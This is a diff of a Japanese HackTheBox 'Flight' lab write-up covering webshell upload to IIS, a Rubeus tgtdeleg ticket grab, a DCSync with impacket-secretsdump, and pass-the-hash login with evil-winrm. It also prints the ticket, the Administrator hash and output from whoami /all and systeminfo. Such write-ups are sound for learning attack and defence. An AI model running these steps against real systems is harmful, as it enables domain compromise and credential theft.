@@ -601,7 +601,7 @@ Active Connections
 ```
 8000番なのでウェブ系かも  
 windowsserver2019なのでcurlでヘッダを確認できた、どうやらiisが動作しているっぽい
-```
+```powershell
 C:\xampp\htdocs\school.flight.htb>curl -s -I http://127.0.0.1:8000
 HTTP/1.1 200 OK
 Content-Length: 45949
@@ -664,7 +664,7 @@ kaliのchiselサーバ上での接続確認
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_06.png">  
 このフォルダはユーザc.bumがwrite権限あり  
 ユーザc.bumでaspx形式のwebshellを書き込みできそう
-```sh
+```powershell
 C:\xampp\htdocs\school.flight.htb>icacls C:\inetpub\development
 C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                        NT SERVICE\TrustedInstaller:(I)(F)
@@ -725,7 +725,7 @@ flight\c.bum
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 webshellをダウンロード  
-```sh
+```powershell
 C:\Windows\system32>cd C:\inetpub\development
 cd C:\inetpub\development
 
@@ -748,7 +748,7 @@ dir
 ```
 webshellにアクセス、コマンドも実行確認  
 iis apppool\defaultapppoolというサービスアカウントで動作している  
-[公式サイト](https://learn.microsoft.com/ja-jp/iis/manage/configuring-security/application-pool-identities#accessing-the-network)では、サービスアカウントはマシンアカウントとしてドメイン環境にログインする  
+[公式サイト](https://learn.microsoft.com/ja-jp/iis/manage/configuring-security/application-pool-identities#accessing-the-network)で確認できる通り、サービスアカウントはマシンアカウントとしてドメイン環境にログインする  
 iisはドメインコントローラ上で動作しているため、結果ドメコン機能をもつマシンアカウントのチケットを取得できるかも  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_07.png">  
 まずはwebshell経由でリバースシェルを取得する  
@@ -851,7 +851,7 @@ C:\Users\Public>.\rubeus.exe tgtdeleg /nowrap
 
       doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECgHBiEQVn4ZViv9i3MF8N65eX7rtTp6EtVlwg6a2zy3Wm7oIgFBk/badWdyyaYlVuKSg3IgiSaqH9xPJtlps0/Cotu6hJjC+IxF2kXPPaYMVy0+OiFIOQ0wOCNvX/rmyOf7bmrp2CTfgYmJYsNQke+AdncCdAZmn07S644WV9ldOG/33Q6G+63WVQxvTQf+Dxei5FLURqdqtXl+dcR7zei38uJVHA3ihsoEVgg/sGcD37/r7Aw5BUmZl1IqxJoarrvEDp9Es41Np2ETYmJ4m1vrG7ka13xYw/8x8yuGvgHPRvxLZ0+1OdBs6TRoiWI64iaD5sc1CWKSPz/tyL7G+o4Il7SfsNO3Aj+oZKiPv4fkkZOY22ba98LzxGrL6e6dv78ALbgy4Z7FqP5TbKGnhtjITs9ZbHLXXzBT/nc/nEaQyE2/faIOkdu5B0uKvrPJhYnPHR2dEe5xGQVxe9bFCQRvzKeOJnOrj5WQA9cRxN/+wPk6jRZL1QkuE5QufumAOsN2/S/HYgO/jbxCMcD401YAly5tc9JZ5QbZDmX1sk+gF/8Z3iPtFYAvYUb05ykjj23KNZ6lJQCVnOeMBSlkH2K2+sUd3+wKv+XYix8f9iCsXdPeskewWc/hPr3NZgKG4CLbn298yNjc2jYYQSOig4PESKcILXxYKLnXSCnT4+ZEvhl3DCHNCpLj0S+DGN+ayG8+r614jGWor/QBSWA0hBGISRg/kab75u0Sn5TdSxn4xbShhkTywZju93gOn2aD4G02XoewJgvLc50KSkuAIsrKp5JelZIPkpNKy9RvcCmzbOKqlIF6FrVDMPhdRFM3Ooen/pb2kFb3cQvIZgVWP8h9MM+rnYu7dw4vABRZtJQXXmcvFxQ3kOtB84QgjHT8WAaN/wKJue+0jCRiq3CKUuEL8b/hS/YAkDbGqXp9Q6WOtLeGl8kU+uB9sWIaBqoJYzfujsQgtvA5KHZx6xuWZVfbreDI2z1hHUiaIdUSnogkSiW/Bbs36gyY44UqHnwXltuHEuJzzHlil1PThbqAEdd3QgvdkUWAvvzS/N49qxzNM8nal8E4kDqEMUFS0M5iaVUwI8yQ4DKu4mCcFYb1p+gzWh2E2IQ2w/uOpUwxfmg/+Xjy7JWFPWjT/hFF6w1kXU1zO5k1HQ5vjVaerzLsEUu3uvq2enycGT2XfhXphF9T0me2iIK1lohvO1AU/VgVGyFwhvXyyilXYHggwzU9f3vsCKD51AYKTxo75t0kjuBM3PmCs32K66PgJ1I+pYB1cIRFdg0n/Dpidi6fwO9MCT2TWNV+XwhVKeyU1jJG0oaWIc5d3IwNyifafhDN2IA+H18dLdEYX1WbyWwG19jG3pRQcieiJxWX+Yy1wo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgzNXrB/OnwsLr2Bu1Oc63G3+vL8KVu7/Ln+EhtFlNbmuhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAxNjE4NDk1NlqmERgPMjAyNTEwMTcwNDQ5NTZapxEYDzIwMjUxMDIzMTg0OTU2WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
 ```
-kerberosチケットをlinux上で使用するためには、kirbiからccacheに変換
+kerberosチケットをlinux上で使用するために、kirbiからccacheに変換
 ```sh
 └─$ base64 -d base64_ticket.kirbi > ticket.kirbi
 
@@ -888,7 +888,12 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
 ```
 dcsync攻撃成功！  
-ちなみに、ipアドレスでなくホスト名を指定しないとPassTheTicketできなかった
+ipアドレスでなくホスト名（flight.htbでも不可）を指定しないとPassTheTicketできなかった  
+rubeusで'cifs/g0.flight.htb'に対するチケットを要求したから？
+```sh
+└─$ tail -n 1 /etc/hosts
+10.129.228.120 flight.htb school.flight.htb g0.flight.htb
+```
 ```sh
 └─$ impacket-secretsdump -k -just-dc-user administrator -just-dc-ntlm -dc-ip 10.129.200.222 g0.flight.htb
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -898,20 +903,122 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
 [*] Cleaning up...
 ```
+winrmでadministratorログイン成功！ルートフラグゲット
 ```sh
-└─$ impacket-psexec -ts -hashes ':43bbfc530bab76141b12c8446e30c17c' 'administrator@10.129.200.222'
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[2025-10-16 16:15:29] [*] Requesting shares on 10.129.200.222.....
-[2025-10-16 16:15:33] [*] Found writable share ADMIN$
-[2025-10-16 16:15:34] [*] Uploading file lfxyvzfW.exe
-[2025-10-16 16:15:39] [*] Opening SVCManager on 10.129.200.222.....
-[2025-10-16 16:15:42] [*] Creating service RzEV on 10.129.200.222.....
-[2025-10-16 16:15:44] [*] Starting service RzEV.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.2989]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32> type C:\Users\administrator\Desktop\root.txt
-f1c0ec4b7252f61fbaea30668463ebd6
+└─$ evil-winrm -i 10.129.200.222 -u administrator -H '43bbfc530bab76141b12c8446e30c17c'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
+e9212925cae6e072088c4cb67d794b8d
 ```
+
+## おまけ
+iis経由でシェルを取得したので、もちろん現ユーザはサービスアカウント
+```powershell
+C:\Users\Public>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                  SID                                                          
+========================== =============================================================
+iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+hotfixはなに一つない
+```powershell
+C:\Users\Public>systeminfo     
+systeminfo
+
+Host Name:                 G0
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-00521-62775-AA402
+Original Install Date:     7/20/2021, 11:21:49 AM
+System Boot Time:          10/17/2025, 4:35:23 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
+                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume3
+System Locale:             en-us;English (United States)
+Input Locale:              it;Italian (Italy)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 2,534 MB
+Virtual Memory: Max Size:  5,503 MB
+Virtual Memory: Available: 4,187 MB
+Virtual Memory: In Use:    1,316 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    flight.htb
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.228.120
+                                 [02]: fe80::9d1c:6eff:2a90:af98
+                                 [03]: dead:beef::9d1c:6eff:2a90:af98
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+ということでポテト系の権限昇格も可能
